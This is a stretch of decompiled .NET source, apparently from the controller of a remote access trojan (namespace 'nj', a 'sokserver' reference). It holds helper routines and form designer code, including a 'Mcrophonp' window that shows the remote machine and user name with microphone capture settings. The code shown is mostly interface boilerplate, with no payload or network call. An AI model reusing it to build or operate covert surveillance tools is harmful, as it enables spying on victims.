			});
		}

		public static string REV(string s)
		{
			string text = "";
			char[] array = s.ToCharArray();
			checked
			{
				for (int i = 0; i < array.Length; i++)
				{
					char c = array[i];
					text = c.ToString() + text;
				}
				return text;
			}
		}

		public static string RN(int c)
		{
			Random random = new Random();
			string text = "";
			string text2 = "abcdefghijklmnopqrstuvwxyz";
			checked
			{
				for (int i = 1; i <= c; i++)
				{
					text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
				}
				return text;
			}
		}

		public static byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		[DllImport("User32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool ShowWindow(IntPtr HWND, int nCmdShow);

		public static string Siz(long s)
		{
			bool flag = s.ToString().Length < 4;
			string result;
			if (flag)
			{
				result = Conversions.ToString(s) + " Bytes";
			}
			else
			{
				double num = (double)s / 1024.0;
				flag = (num < 1024.0);
				string str;
				if (flag)
				{
					str = "KB";
				}
				else
				{
					num /= 1024.0;
					flag = (num < 1024.0);
					if (flag)
					{
						str = "MB";
					}
					else
					{
						num /= 1024.0;
						str = "GB";
					}
				}
				result = num.ToString(".0") + " " + str;
			}
			return result;
		}

		public static void STV(string Name, string v)
		{
			try
			{
				Registry.CurrentUser.CreateSubKey("Software\\" + sokserver.vr).SetValue(Name, v);
			}
			catch (Exception expr_25)
			{
				ProjectData.SetProjectError(expr_25);
				Exception projectError = expr_25;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		public static byte[] ZIP(byte[] B, ref bool CM)
		{
			bool flag = CM;
			checked
			{
				byte[] result;
				if (flag)
				{
					MemoryStream memoryStream = new MemoryStream();
					GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
					gZipStream.Write(B, 0, B.Length);
					gZipStream.Dispose();
					memoryStream.Position = 0L;
					byte[] array = new byte[(int)memoryStream.Length + 1 - 1 + 1];
					memoryStream.Read(array, 0, array.Length);
					memoryStream.Dispose();
					result = array;
				}
				else
				{
					MemoryStream memoryStream2 = new MemoryStream(B);
					GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
					byte[] array2 = new byte[4];
					memoryStream2.Position = memoryStream2.Length - 5L;
					memoryStream2.Read(array2, 0, 4);
					int num = BitConverter.ToInt32(array2, 0);
					memoryStream2.Position = 0L;
					byte[] array3 = new byte[num - 1 + 1 - 1 + 1];
					gZipStream2.Read(array3, 0, num);
					gZipStream2.Dispose();
					memoryStream2.Dispose();
					result = array3;
				}
				return result;
			}
		}

		public static object GetValueReg(string p1)
		{
			object result;
			return result;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using nj.My.Resources;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form1 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("LogInContextMenu1")]
		private LogInContextMenu _LogInContextMenu1;

		[AccessedThroughProperty("NsPaginator1")]
		private NSPaginator _NsPaginator1;

		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		internal virtual LogInContextMenu LogInContextMenu1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInContextMenu1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInContextMenu1 = value;
			}
		}

		internal virtual NSPaginator NsPaginator1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NsPaginator1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NsPaginator1 = value;
			}
		}

		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form1()
		{
			base.Load += new EventHandler(this.Form1_Load);
			Form1.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form1.__ENCList.Count == Form1.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form1.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form1.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form1.__ENCList[num] = Form1.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
						Form1.__ENCList.Capacity = Form1.__ENCList.Count;
					}
					Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			this.ComboBox1 = new ComboBox();
			this.Button2 = new Button();
			this.Label4 = new Label();
			this.ProgressBar1 = new ProgressBar();
			this.Label3 = new Label();
			this.Timer1 = new Timer(this.components);
			this.Label1 = new Label();
			this.ComboBox2 = new ComboBox();
			this.NsPaginator1 = new NSPaginator();
			this.LogInContextMenu1 = new LogInContextMenu();
			this.SuspendLayout();
			this.ComboBox1.BackColor = Color.Black;
			this.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox1.FlatStyle = FlatStyle.Flat;
			this.ComboBox1.ForeColor = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Items.AddRange(new object[]
			{
				"4 kb 8bit",
				"6 kb 8bit",
				"8 kb 8bit",
				"8 kb 16bit",
				"12 kb 16bit",
				"16 kb 16bit",
				"20 kb 16bit",
				"24 kb 16bit"
			});
			Control arg_15F_0 = this.ComboBox1;
			Point location = new Point(122, 30);
			arg_15F_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_18A_0 = this.ComboBox1;
			Size size = new Size(106, 21);
			arg_18A_0.Size = size;
			this.ComboBox1.TabIndex = 30;
			this.Button2.BackColor = SystemColors.ActiveCaptionText;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_201_0 = this.Button2;
			location = new Point(235, 2);
			arg_201_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_22C_0 = this.Button2;
			size = new Size(124, 54);
			arg_22C_0.Size = size;
			this.Button2.TabIndex = 35;
			this.Button2.Text = "Start";
			this.Button2.UseVisualStyleBackColor = false;
			this.Label4.AutoSize = true;
			this.Label4.ForeColor = Color.LightSteelBlue;
			Control arg_290_0 = this.Label4;
			location = new Point(12, 27);
			arg_290_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_2BB_0 = this.Label4;
			size = new Size(56, 13);
			arg_2BB_0.Size = size;
			this.Label4.TabIndex = 37;
			this.Label4.Text = "BufferSize";
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_300_0 = this.ProgressBar1;
			location = new Point(0, 58);
			arg_300_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_32E_0 = this.ProgressBar1;
			size = new Size(359, 10);
			arg_32E_0.Size = size;
			this.ProgressBar1.TabIndex = 38;
			this.Label3.AutoSize = true;
			this.Label3.BackColor = SystemColors.ActiveCaptionText;
			this.Label3.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.Silver;
			Control arg_3A3_0 = this.Label3;
			location = new Point(74, 27);
			arg_3A3_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_3CE_0 = this.Label3;
			size = new Size(16, 16);
			arg_3CE_0.Size = size;
			this.Label3.TabIndex = 39;
			this.Label3.Text = "1";
			this.Label1.AutoSize = true;
			this.Label1.Image = (Image)componentResourceManager.GetObject("Label1.Image");
			Control arg_433_0 = this.Label1;
			location = new Point(243, 24);
			arg_433_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_45E_0 = this.Label1;
			size = new Size(15, 13);
			arg_45E_0.Size = size;
			this.Label1.TabIndex = 40;
			this.Label1.Text = "..";
			this.ComboBox2.BackColor = Color.Black;
			this.ComboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox2.FlatStyle = FlatStyle.Flat;
			this.ComboBox2.ForeColor = Color.LightSteelBlue;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Items.AddRange(new object[]
			{
				"Mcrophonp {Realtek} "
			});
			Control arg_500_0 = this.ComboBox2;
			location = new Point(4, 3);
			arg_500_0.Location = location;
			this.ComboBox2.Name = "ComboBox2";
			Control arg_52E_0 = this.ComboBox2;
			size = new Size(224, 21);
			arg_52E_0.Size = size;
			this.ComboBox2.TabIndex = 41;
			Control arg_559_0 = this.NsPaginator1;
			location = new Point(533, 37);
			arg_559_0.Location = location;
			this.NsPaginator1.Name = "NsPaginator1";
			this.NsPaginator1.NumberOfPages = 0;
			this.NsPaginator1.SelectedIndex = 0;
			Control arg_5A1_0 = this.NsPaginator1;
			size = new Size(202, 26);
			arg_5A1_0.Size = size;
			this.NsPaginator1.TabIndex = 14;
			this.NsPaginator1.Text = "NsPaginator1";
			this.LogInContextMenu1.FontColour = Color.FromArgb(55, 255, 255);
			this.LogInContextMenu1.ForeColor = Color.FromArgb(255, 255, 255);
			this.LogInContextMenu1.Name = "LogInContextMenu1";
			this.LogInContextMenu1.ShowImageMargin = false;
			Control arg_634_0 = this.LogInContextMenu1;
			size = new Size(36, 4);
			arg_634_0.Size = size;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(359, 68);
			this.ClientSize = size;
			this.Controls.Add(this.ComboBox2);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label4);
			this.Controls.Add(this.ComboBox1);
			this.Controls.Add(this.NsPaginator1);
			this.Controls.Add(this.Button2);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(375, 102);
			this.MaximumSize = size;
			size = new Size(375, 102);
			this.MinimumSize = size;
			this.Name = "Form1";
			this.Text = "Mcrophonp";
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void NshScrollBar1_Scroll(object sender)
		{
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			this.Text = "Mcrophonp: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 110;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			Label label = this.Label3;
			label.Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
			bool flag = Conversions.ToDouble(this.Label3.Text) == 25000.0;
			if (flag)
			{
				this.Timer1.Enabled = false;
			}
			flag = (this.ProgressBar1.Value == 100);
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			this.Timer1.Start();
			MyProject.Computer.Audio.Play(Resources.Sound0, AudioPlayMode.Background);
		}

		private void NsComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form3 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog _OpenFileDialog1;

		[AccessedThroughProperty("OpenFileDialog2")]
		private OpenFileDialog _OpenFileDialog2;

		[AccessedThroughProperty("NyX_Button2")]
		private NYX_Button _NyX_Button2;

		[AccessedThroughProperty("GroupBox4")]
		private GroupBox _GroupBox4;

		[AccessedThroughProperty("GR_Check")]
		private NYX_CheckBox _GR_Check;

		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		[AccessedThroughProperty("NyX_Button1")]
		private NYX_Button _NyX_Button1;

		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		[AccessedThroughProperty("GroupBox2")]
		private GroupBox _GroupBox2;

		[AccessedThroughProperty("PictureBox4")]
		private PictureBox _PictureBox4;

		[AccessedThroughProperty("GroupBox3")]
		private GroupBox _GroupBox3;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		[AccessedThroughProperty("NsRadioButton1")]
		private NSRadioButton _NsRadioButton1;

		[AccessedThroughProperty("LinkLabel1")]
		private LinkLabel _LinkLabel1;

		internal virtual OpenFileDialog OpenFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFileDialog1 = value;
			}
		}

		internal virtual OpenFileDialog OpenFileDialog2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.OpenFileDialog2_FileOk);
				bool flag = this._OpenFileDialog2 != null;
				if (flag)
				{
					this._OpenFileDialog2.FileOk -= value2;
				}
				this._OpenFileDialog2 = value;
				flag = (this._OpenFileDialog2 != null);
				if (flag)
				{
					this._OpenFileDialog2.FileOk += value2;
				}
			}
		}

		internal virtual NYX_Button NyX_Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_Button2 = value;
			}
		}

		internal virtual GroupBox GroupBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox4 = value;
			}
		}

		internal virtual NYX_CheckBox GR_Check
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GR_Check;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				NYX_CheckBox.CheckedChangedEventHandler obj = new NYX_CheckBox.CheckedChangedEventHandler(this.GR_Check_CheckedChanged_1);
				bool flag = this._GR_Check != null;
				if (flag)
				{
					this._GR_Check.CheckedChanged -= obj;
				}
				this._GR_Check = value;
				flag = (this._GR_Check != null);
				if (flag)
				{
					this._GR_Check.CheckedChanged += obj;
				}
			}
		}

		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		internal virtual NYX_Button NyX_Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Button1_Click_1);
				bool flag = this._NyX_Button1 != null;
				if (flag)
				{
					this._NyX_Button1.Click -= value2;
				}
				this._NyX_Button1 = value;
				flag = (this._NyX_Button1 != null);
				if (flag)
				{
					this._NyX_Button1.Click += value2;
				}
			}
		}

		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_1);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button9_Click);
				bool flag = this._Button9 != null;
				if (flag)
				{
					this._Button9.Click -= value2;
				}
				this._Button9 = value;
				flag = (this._Button9 != null);
				if (flag)
				{
					this._Button9.Click += value2;
				}
			}
		}

		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button8_Click);
				bool flag = this._Button8 != null;
				if (flag)
				{
					this._Button8.Click -= value2;
				}
				this._Button8 = value;
				flag = (this._Button8 != null);
				if (flag)
				{
					this._Button8.Click += value2;
				}
			}
		}

		internal virtual GroupBox GroupBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox2 = value;
			}
		}

		internal virtual PictureBox PictureBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox4 = value;
			}
		}

		internal virtual GroupBox GroupBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox3 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click_1);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox1_CheckedChanged);
				bool flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged -= value2;
				}
				this._CheckBox1 = value;
				flag = (this._CheckBox1 != null);
				if (flag)
				{
					this._CheckBox1.CheckedChanged += value2;
				}
			}
		}

		internal virtual NSRadioButton NsRadioButton1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NsRadioButton1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				NSRadioButton.CheckedChangedEventHandler obj = new NSRadioButton.CheckedChangedEventHandler(this.NsRadioButton1_CheckedChanged);
				bool flag = this._NsRadioButton1 != null;
				if (flag)
				{
					this._NsRadioButton1.CheckedChanged -= obj;
				}
				this._NsRadioButton1 = value;
				flag = (this._NsRadioButton1 != null);
				if (flag)
				{
					this._NsRadioButton1.CheckedChanged += obj;
				}
			}
		}

		internal virtual LinkLabel LinkLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LinkLabel1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form3()
		{
			base.Load += new EventHandler(this.Form3_Load);
			Form3.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form3.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form3.__ENCList.Count == Form3.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form3.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form3.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form3.__ENCList[num] = Form3.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form3.__ENCList.RemoveRange(num, Form3.__ENCList.Count - num);
						Form3.__ENCList.Capacity = Form3.__ENCList.Count;
					}
					Form3.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form3));
			this.OpenFileDialog1 = new OpenFileDialog();
			this.OpenFileDialog2 = new OpenFileDialog();
			this.GroupBox4 = new GroupBox();
			this.GroupBox1 = new GroupBox();
			this.PictureBox2 = new PictureBox();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.Button9 = new Button();
			this.Button8 = new Button();
			this.GroupBox2 = new GroupBox();
			this.PictureBox4 = new PictureBox();
			this.GroupBox3 = new GroupBox();
			this.PictureBox1 = new PictureBox();
			this.Button3 = new Button();
			this.Button4 = new Button();
			this.CheckBox1 = new CheckBox();
			this.NsRadioButton1 = new NSRadioButton();
			this.GR_Check = new NYX_CheckBox();
			this.NyX_Button1 = new NYX_Button();
			this.NyX_Button2 = new NYX_Button();
			this.LinkLabel1 = new LinkLabel();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			this.GroupBox2.SuspendLayout();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			this.GroupBox3.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.OpenFileDialog1.Filter = "Image|*.*";
			this.OpenFileDialog2.Filter = "Image|*.*";
			this.GroupBox4.ForeColor = Color.Red;
			Control arg_19C_0 = this.GroupBox4;
			Point location = new Point(381, 292);
			arg_19C_0.Location = location;
			this.GroupBox4.Name = "GroupBox4";
			Control arg_1CA_0 = this.GroupBox4;
			Size size = new Size(155, 49);
			arg_1CA_0.Size = size;
			this.GroupBox4.TabIndex = 33;
			this.GroupBox4.TabStop = false;
			this.GroupBox4.Text = "Gridlines";
			this.GroupBox1.ForeColor = Color.Red;
			Control arg_223_0 = this.GroupBox1;
			location = new Point(84, 287);
			arg_223_0.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			Control arg_251_0 = this.GroupBox1;
			size = new Size(289, 55);
			arg_251_0.Size = size;
			this.GroupBox1.TabIndex = 32;
			this.GroupBox1.TabStop = false;
			this.GroupBox1.Text = "Color";
			this.PictureBox2.BorderStyle = BorderStyle.FixedSingle;
			Control arg_2A9_0 = this.PictureBox2;
			location = new Point(448, 363);
			arg_2A9_0.Location = location;
			this.PictureBox2.Name = "PictureBox2";
			Control arg_2D4_0 = this.PictureBox2;
			size = new Size(111, 37);
			arg_2D4_0.Size = size;
			this.PictureBox2.TabIndex = 11;
			this.PictureBox2.TabStop = false;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_344_0 = this.Button1;
			location = new Point(12, 12);
			arg_344_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_36F_0 = this.Button1;
			size = new Size(52, 54);
			arg_36F_0.Size = size;
			this.Button1.TabIndex = 26;
			this.Button1.Text = "BR";
			this.Button1.UseVisualStyleBackColor = true;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Palatino Linotype", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
